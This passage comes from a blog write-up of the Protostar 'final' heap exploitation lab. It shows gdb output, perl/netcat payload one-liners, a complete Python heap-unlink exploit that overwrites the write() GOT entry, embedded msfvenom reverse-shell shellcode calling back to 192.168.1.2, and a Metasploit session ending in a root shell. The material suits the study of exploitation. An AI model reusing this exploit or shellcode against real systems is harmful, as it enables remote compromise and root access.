<span class="mh">0x804aaf2</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0x804aaf5</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span>
<span class="mh">0x804aaf8</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">310</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x804aafb</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">313</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
<span class="mh">0x804aafe</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">316</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x30</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x804ab01</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">319</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x38</span><span class="p">]</span>
<span class="mh">0x804ab04</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">322</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x34</span>
<span class="o">--------------------------------------------------------------------------------</span>
</code></pre></div>


<p>Great!
So we need to figure out what pointers to overwrite.
A write() call is executed just before the free().
We can overwrite the GOT with our address.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">3</span><span class="n">i</span> <span class="mh">0x8048dfc</span>
<span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x804d41c</span>
<span class="mh">0x8048e02</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="mh">0x68</span>
<span class="mh">0x8048e07</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x8048d1c</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804d41c</span>
<span class="mh">0x804d41c</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="mh">0xb7f53c70</span>
</code></pre></div>


<p>For best results, we can utilize a third chunk as our target buffer.
Just append some more bytes to the input command.
The respective heap address is as follows.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">gdb</span><span class="err">$</span> <span class="n">disas</span> <span class="n">chex</span><span class="o">/</span><span class="mi">34</span><span class="n">x</span>  <span class="mh">0x0804E118</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804e110</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000089</span>	<span class="mh">0x44525346</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e120</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0x0804d410</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e130</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e140</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e150</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e160</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e170</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e180</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804e190</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0x00cccccc</span>
</code></pre></div>


<p>We update the BK pointer in our command to direct the execution into chunk three.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span>perl -e <span class="s1">&#39;print(&quot;FSRD&quot;.&quot;A&quot;x108 .&quot;\xF0\xFF\xFF\xFF&quot;.&quot;\xFC\xFF\xFF\xFF&quot;.&quot;EEEE&quot;.&quot;FFF&quot; .&quot;/&quot;.&quot;FSRDROOT&quot;.&quot;B&quot;x103 .&quot;/\xFC\xFF\xFF\xFF\xF0\xFF\xFF\xFF&quot;.&quot;\x10\xD4\x04\x08&quot;.&quot;\x20\xE1\x04\x08&quot;. &quot;FSRD&quot;.&quot;\xCC&quot;x128)&#39;</span> <span class="p">|</span> nc 192.168.1.6 299
</code></pre></div>


<p>And with this command the execution hopefully stops with a SIGTRAP instruction.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGTRAP</span><span class="p">,</span> <span class="n">Trace</span><span class="o">/</span><span class="n">breakpoint</span> <span class="n">trap</span><span class="p">.</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x00000004</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x0804C2D6</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0x0804E078</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">S</span> <span class="n">z</span> <span class="n">A</span> <span class="n">p</span> <span class="n">C</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xBFFFF678</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFF24C</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x0804E121</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>
<span class="mh">0x804e121</span><span class="o">:</span>	<span class="n">int3</span>   
<span class="mh">0x804e122</span><span class="o">:</span>	<span class="n">int3</span>   
<span class="mh">0x804e123</span><span class="o">:</span>	<span class="n">int3</span>   
<span class="o">--------------------------------------------------------------------------------</span>
<span class="mh">0x0804e121</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</code></pre></div>


<p>Next, we need to introduce a jmp over BK+8 where the pointer to 0x0804d410 will be written.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">perl -e &#39;print(&quot;FSRD&quot;.&quot;A&quot;x108 .&quot;\xF0\xFF\xFF\xFF&quot;.&quot;\xFC\xFF\xFF\xFF&quot;.&quot;EEEE&quot;.&quot;FFF&quot; .&quot;/&quot;.&quot;FSRDROOT&quot;.&quot;B&quot;x103 .&quot;/\xFC\xFF\xFF\xFF\xF0\xFF\xFF\xFF&quot;.&quot;\x10\xD4\x04\x08&quot;.&quot;\x20\xE1\x04\x08&quot;. &quot;FSRD&quot;.&quot;\x90&quot;x10 .&quot;\xEB\x04&quot;.&quot;XXXX&quot;.&quot;\x90&quot;x100 .&quot;\xCC&quot;)&#39; | nc 192.168.1.6 2993</span>
</code></pre></div>


<p>And finally, we place a shellcode in the chunk3.
The reverse shell from the last example fits fine into the third junk.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python</span>
<span class="lineno"> 2 </span><span class="c"># -*- coding: utf-8 -*-</span>
<span class="lineno"> 3 </span>
<span class="lineno"> 4 </span><span class="kn">import</span> <span class="nn">socket</span>
<span class="lineno"> 5 </span><span class="kn">import</span> <span class="nn">struct</span>
<span class="lineno"> 6 </span><span class="kn">import</span> <span class="nn">sys</span>
<span class="lineno"> 7 </span>
<span class="lineno"> 8 </span><span class="c">#TARGET</span>
<span class="lineno"> 9 </span><span class="n">target_ip</span> <span class="o">=</span> <span class="s">&quot;192.168.1.6&quot;</span>
<span class="lineno">10 </span><span class="n">target_port</span> <span class="o">=</span> <span class="mi">2993</span>
<span class="lineno">11 </span>
<span class="lineno">12 </span><span class="c">#target addre#$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f python -e x86/shikata_ga_nai</span>
<span class="lineno">13 </span><span class="n">shellcode</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span>
<span class="lineno">14 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xba\xe7\x96\xde\xe9\xda\xce\xd9\x74\x24\xf4\x5b\x2b</span><span class="s">&quot;</span>
<span class="lineno">15 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x12\x31\x53\x12\x83\xc3\x04\x03\xb4\x98\x3c</span><span class="s">&quot;</span>
<span class="lineno">16 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x1c\x0b\x7e\x37\x3c\x38\xc3\xeb\xa9\xbc\x4a\xea\x9e</span><span class="s">&quot;</span>
<span class="lineno">17 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xa6\x81\x6d\x4d\x7f\xaa\x51\xbf\xff\x83\xd4\xc6\x97</span><span class="s">&quot;</span>
<span class="lineno">18 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xd3\x8f\x38\x65\xbc\xcd\x3a\x78\x60\x5b\xdb\xca\xfe</span><span class="s">&quot;</span>
<span class="lineno">19 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x0b\x4d\x79\x4c\xa8\xe4\x9c\x7f\x2f\xa4\x36\xaf\x1f</span><span class="s">&quot;</span>
<span class="lineno">20 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x3a\xae\xc7\x70\xde\x47\x76\x06\xfd\xc5\xd5\x91\xe3</span><span class="s">&quot;</span>
<span class="lineno">21 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x59\xd2\x6c\x63</span><span class="s">&quot;</span>
<span class="lineno">22 </span>
<span class="lineno">23 </span><span class="n">vchunk</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\xF0\xFF\xFF\xFF</span><span class="s">&quot;</span>
<span class="lineno">24 </span><span class="n">vchunk</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xFC\xFF\xFF\xFF</span><span class="s">&quot;</span>
<span class="lineno">25 </span><span class="n">vchunk</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span> <span class="c">#FD</span>
<span class="lineno">26 </span><span class="n">vchunk</span> <span class="o">+=</span> <span class="s">&quot;CCC&quot;</span> <span class="c">#BK (for alignment on byte short)</span>
<span class="lineno">27 </span>
<span class="lineno">28 </span><span class="n">payload1</span> <span class="o">=</span>  <span class="s">&quot;FSRD&quot;</span>
<span class="lineno">29 </span><span class="n">payload1</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">vchunk</span><span class="p">))</span>
<span class="lineno">30 </span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">vchunk</span>
<span class="lineno">31 </span><span class="n">payload1</span> <span class="o">+=</span> <span class="s">&quot;/&quot;</span>
<span class="lineno">32 </span>
<span class="lineno">33 </span><span class="n">FD</span> <span class="o">=</span> <span class="mh">0x804D41C</span> <span class="c">#write()</span>
<span class="lineno">34 </span><span class="n">BK</span> <span class="o">=</span> <span class="mh">0x804E120</span> <span class="c">#write()</span>
<span class="lineno">35 </span><span class="n">chunk</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\xFC\xFF\xFF\xFF</span><span class="s">&quot;</span>
<span class="lineno">36 </span><span class="n">chunk</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xF0\xFF\xFF\xFF</span><span class="s">&quot;</span>
<span class="lineno">37 </span><span class="n">chunk</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">FD</span><span class="o">-</span><span class="mh">0xc</span><span class="p">)</span> <span class="c">#FD -0xc in free</span>
<span class="lineno">38 </span><span class="n">chunk</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">BK</span><span class="p">)</span> <span class="c">#BK</span>
<span class="lineno">39 </span>
<span class="lineno">40 </span><span class="n">payload2</span> <span class="o">=</span>  <span class="s">&quot;FSRD&quot;</span>
<span class="lineno">41 </span><span class="n">payload2</span> <span class="o">+=</span> <span class="s">&quot;ROOT&quot;</span>
<span class="lineno">42 </span><span class="n">payload2</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="lineno">43 </span><span class="n">payload2</span> <span class="o">+=</span> <span class="s">&quot;/&quot;</span>
<span class="lineno">44 </span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">chunk</span>
<span class="lineno">45 </span>
<span class="lineno">46 </span><span class="n">payload3</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">14</span>
<span class="lineno">47 </span><span class="n">payload3</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xEB\x04</span><span class="s">&quot;</span> <span class="c">#JMP 4</span>
<span class="lineno">48 </span><span class="n">payload3</span> <span class="o">+=</span> <span class="s">&quot;XXXX&quot;</span>     <span class="c">#FD will be written to this location</span>
<span class="lineno">49 </span><span class="k">print</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="lineno">50 </span><span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="lineno">51 </span><span class="n">payload3</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="lineno">52 </span><span class="n">payload3</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="lineno">53 </span><span class="n">payload3</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xcc</span><span class="s">&quot;</span>
<span class="lineno">54 </span>
<span class="lineno">55 </span>
<span class="lineno">56 </span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">:</span>
<span class="lineno">57 </span>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Exploit code too large&quot;</span><span class="p">)</span>
<span class="lineno">58 </span>  <span class="nb">exit</span><span class="p">()</span>
<span class="lineno">59 </span>
<span class="lineno">60 </span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
<span class="lineno">61 </span><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
<span class="lineno">62 </span><span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
<span class="lineno">63 </span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">))</span>
<span class="lineno">64 </span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="lineno">65 </span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
<span class="lineno">66 </span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="lineno">67 </span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
<span class="lineno">68 </span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</code></pre></div>


<p>Now we only have to wait for a reverse connection.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> msfcli exploit/multi/handler <span class="nv">payload</span><span class="o">=</span>linux/x86/shell_reverse_tcp <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span>  E
<span class="go">[*] Initializing modules...</span>
<span class="go">payload =&gt; linux/x86/shell_reverse_tcp</span>
<span class="go">lport =&gt; 4444</span>
<span class="go">[*] Started reverse handler on 0.0.0.0:4444</span>
<span class="go">[*] Starting the payload handler...</span>
<span class="go">[*] Command shell session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.6:49839) at 2015-07-04 11:15:03 +0200</span>

<span class="go">whoami</span>
<span class="go">root</span>
<span class="go">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<span class="gp">#</span> <span class="nb">pwd</span>
<span class="go">pwd</span>
<span class="go">/</span>
</code></pre></div>


<h1 id="acknowledgements">Acknowledgements</h1>

<p>Finally, a big thanks to the creators of the protostar exploit exercises.
The challenges present quite a steep learning curve.
A great curse to try harder each exercise.</p>

<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-final/">TheSprawl - protostar - final levels</a></li>
<li><a href="http://www.kroosec.com/search/label/exploit-exercises">Hani&rsquo;s blog - exploit-exercises</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2015/07/Offensive-Security-Certified-Expert/"> Offensive Security Certified Expert</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Heap-levels/"> Exploit Exercises - Protostar - Heap levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; . All rights reserved. </p>
    </footer>

  
  

  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>

  <script src="/js/bootstrap.min.js"></script>
  <script src="/js/bootstrap.js"></script>
  <script type="text/javascript" src="/js/hc.js"></script>

  
  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>

  

  

</footer>

	</body>
</html>
